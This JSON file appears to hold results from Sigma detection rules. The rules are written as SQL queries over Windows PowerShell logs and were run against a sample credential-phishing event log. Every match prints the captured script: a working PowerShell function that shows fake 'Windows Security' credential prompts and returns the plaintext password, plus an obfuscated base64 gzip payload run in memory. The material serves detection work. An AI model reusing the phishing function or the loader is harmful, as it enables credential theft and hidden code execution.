[{
  "title": "PowerShell Credential Prompt",
  "id": "ca8b77a9-d499-4095-b793-5d5f330d450e",
  "description": "Detects PowerShell calling a credential prompt",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND ScriptBlockText LIKE '%PromptForCredential%' ESCAPE '\\')"
  ],
  "rule_level": "high",
  "tags": [
    "attack.credential-access",
    "attack.execution",
    "attack.t1059.001"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "ActivityID": "B5ABE6C2-675C-0001-A601-ACB55C67D501",
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 4104,
      "EventRecordID": 1123,
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
      "Keywords": "0x0",
      "Level": 3,
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Opcode": 15,
      "OriginalLogfile": "phish_windows_credentials_powershell_scriptblockLog_4104.evtx",
      "ProcessID": 5500,
      "Provider_Name": "Microsoft-Windows-PowerShell",
      "ScriptBlockId": "c7ca7056-b317-4fff-b796-05d8ef896dcd",
      "ScriptBlockText": "function Invoke-LoginPrompt{\n$cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\")\n$username = \"$env:username\"\n$domain = \"$env:userdomain\"\n$full = \"$domain\" + \"\\\" + \"$username\"\n$password = $cred.GetNetworkCredential().password\nAdd-Type -assemblyname System.DirectoryServices.AccountManagement\n$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\nwhile($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){\n    $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\")\n    $username = \"$env:username\"\n    $domain = \"$env:userdomain\"\n    $full = \"$domain\" + \"\\\" + \"$username\"\n    $password = $cred.GetNetworkCredential().password\n    Add-Type -assemblyname System.DirectoryServices.AccountManagement\n    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\n    $DS.ValidateCredentials(\"$full\", \"$password\") | out-null\n    }\n $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password\n $output\n R{START_PROCESS}\n}\nInvoke-LoginPrompt",
      "SystemTime": "2019-09-09T13:35:09.315230Z",
      "Task": 2,
      "ThreadID": 356,
      "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
      "Version": 1
    }
  ]
},
{
  "title": "Suspicious FromBase64String Usage On Gzip Archive - Ps Script",
  "id": "df69cb1d-b891-4cd9-90c7-d617d90100ce",
  "description": "Detects attempts of decoding a base64 Gzip archive in a PowerShell script. This technique is often used as a method to load malicious content into memory afterward.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND (ScriptBlockText LIKE '%FromBase64String%' ESCAPE '\\' AND ScriptBlockText LIKE '%MemoryStream%' ESCAPE '\\' AND ScriptBlockText LIKE '%H4sI%' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.command-and-control",
    "attack.t1132.001"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1,
      "ActivityID": "B5ABE6C2-675C-0000-AAFD-ABB55C67D501",
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 4104,
      "EventRecordID": 1122,
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
      "Keywords": "0x0",
      "Level": 3,
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Opcode": 15,
      "OriginalLogfile": "phish_windows_credentials_powershell_scriptblockLog_4104.evtx",
      "ProcessID": 5500,
      "Provider_Name": "Microsoft-Windows-PowerShell",
      "ScriptBlockId": "37f6d110-cfdf-4118-8748-17638e258531",
      "ScriptBlockText": "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAAlVdl0CA81UXW/aMBR996+4svJANJIfgNQHBNs6aaWIsO2hnSbXuaVeEzuyHdKI8d93YwIDTUJlfVkeLPme+3F87lEeay29Mho+6bV5xuSzWSk9t6as/IZF0mIOVxBdG+fTWqU74IOxEwJQeyWKAf+mdG4aBxnK2irf8iHweYHCIVAKWqgdHfJQ4bqECPV61AG5KYXS94e7FiXyIecxi/ZXYsBPcRbtyk6QXYiwx7ooAtJH4B3w+3BGRx0q4VxjbHhfRy79iH6GnkLPR6+L030eG+d5smwrhIQiWD4UbSCXtc5jmU6VRemNbTO0ayXRpWMpTa39jdBihSX1Y9E0o2kzbJLbh5+UfUEtSa+0VJUoJoZEffGDuwuK+5qO/ffR6EbIJ6UxZs2TKnBArNKvolC58Pjn5W7Ag5C0i4NUPIZEI0RLW2O8YUDfv1uEDNcNhaORQ+h9420LYtXt7nVWCUzO2CXgZywT8FfZJmRebJ2u6u32CbP/Mwv1nM4aCE4c9AtM7RNNSCjeMogoUNW+U1NjszfUGWGph8OCKCdmJ8IX2s+M1BzCNOyOjHSQvu/OYLHJluPF8sd8cTt5n2VbtmV///R+A6HMO3IQBQAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",
      "SystemTime": "2019-09-09T13:35:08.655802Z",
      "Task": 2,
      "ThreadID": 356,
      "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
      "Version": 1
    }
  ]
},
{
  "title": "Manipulation of User Computer or Group Security Principals Across AD",
  "id": "b29a93fb-087c-4b5b-a84d-ee3309e69d08",
  "description": "Adversaries may create a domain account to maintain access to victim systems.\nDomain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain..\n",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND ScriptBlockText LIKE '%System.DirectoryServices.AccountManagement%' ESCAPE '\\')"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.persistence",
    "attack.t1136.002"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "ActivityID": "B5ABE6C2-675C-0001-A601-ACB55C67D501",
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 4104,
      "EventRecordID": 1123,
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
      "Keywords": "0x0",
      "Level": 3,
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Opcode": 15,
      "OriginalLogfile": "phish_windows_credentials_powershell_scriptblockLog_4104.evtx",
      "ProcessID": 5500,
      "Provider_Name": "Microsoft-Windows-PowerShell",
      "ScriptBlockId": "c7ca7056-b317-4fff-b796-05d8ef896dcd",
      "ScriptBlockText": "function Invoke-LoginPrompt{\n$cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\")\n$username = \"$env:username\"\n$domain = \"$env:userdomain\"\n$full = \"$domain\" + \"\\\" + \"$username\"\n$password = $cred.GetNetworkCredential().password\nAdd-Type -assemblyname System.DirectoryServices.AccountManagement\n$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\nwhile($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){\n    $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\")\n    $username = \"$env:username\"\n    $domain = \"$env:userdomain\"\n    $full = \"$domain\" + \"\\\" + \"$username\"\n    $password = $cred.GetNetworkCredential().password\n    Add-Type -assemblyname System.DirectoryServices.AccountManagement\n    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\n    $DS.ValidateCredentials(\"$full\", \"$password\") | out-null\n    }\n $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password\n $output\n R{START_PROCESS}\n}\nInvoke-LoginPrompt",
      "SystemTime": "2019-09-09T13:35:09.315230Z",
      "Task": 2,
      "ThreadID": 356,
      "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
      "Version": 1
    }
  ]
},
{
  "title": "Suspicious PowerShell Get Current User",
  "id": "4096a49c-7de4-4da0-a230-c66ccd56ea5a",
  "description": "Detects the use of PowerShell to identify the current logged user.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE (Channel='Microsoft-Windows-PowerShell/Operational' OR Channel='PowerShellCore/Operational') AND (EventID=4104 AND (ScriptBlockText LIKE '%[System.Environment]::UserName%' ESCAPE '\\' OR ScriptBlockText LIKE '%$env:UserName%' ESCAPE '\\' OR ScriptBlockText LIKE '%[System.Security.Principal.WindowsIdentity]::GetCurrent()%' ESCAPE '\\'))"
  ],
  "rule_level": "low",
  "tags": [
    "attack.discovery",
    "attack.t1033"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "ActivityID": "B5ABE6C2-675C-0001-A601-ACB55C67D501",
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "MSEDGEWIN10",
      "EventID": 4104,
      "EventRecordID": 1123,
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
      "Keywords": "0x0",
      "Level": 3,
      "MessageNumber": 1,
      "MessageTotal": 1,
      "Opcode": 15,
      "OriginalLogfile": "phish_windows_credentials_powershell_scriptblockLog_4104.evtx",
      "ProcessID": 5500,
      "Provider_Name": "Microsoft-Windows-PowerShell",
      "ScriptBlockId": "c7ca7056-b317-4fff-b796-05d8ef896dcd",
      "ScriptBlockText": "function Invoke-LoginPrompt{\n$cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\")\n$username = \"$env:username\"\n$domain = \"$env:userdomain\"\n$full = \"$domain\" + \"\\\" + \"$username\"\n$password = $cred.GetNetworkCredential().password\nAdd-Type -assemblyname System.DirectoryServices.AccountManagement\n$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\nwhile($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){\n    $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\")\n    $username = \"$env:username\"\n    $domain = \"$env:userdomain\"\n    $full = \"$domain\" + \"\\\" + \"$username\"\n    $password = $cred.GetNetworkCredential().password\n    Add-Type -assemblyname System.DirectoryServices.AccountManagement\n    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\n    $DS.ValidateCredentials(\"$full\", \"$password\") | out-null\n    }\n $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password\n $output\n R{START_PROCESS}\n}\nInvoke-LoginPrompt",
      "SystemTime": "2019-09-09T13:35:09.315230Z",
      "Task": 2,
      "ThreadID": 356,
      "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
      "Version": 1
    }
  ]
}]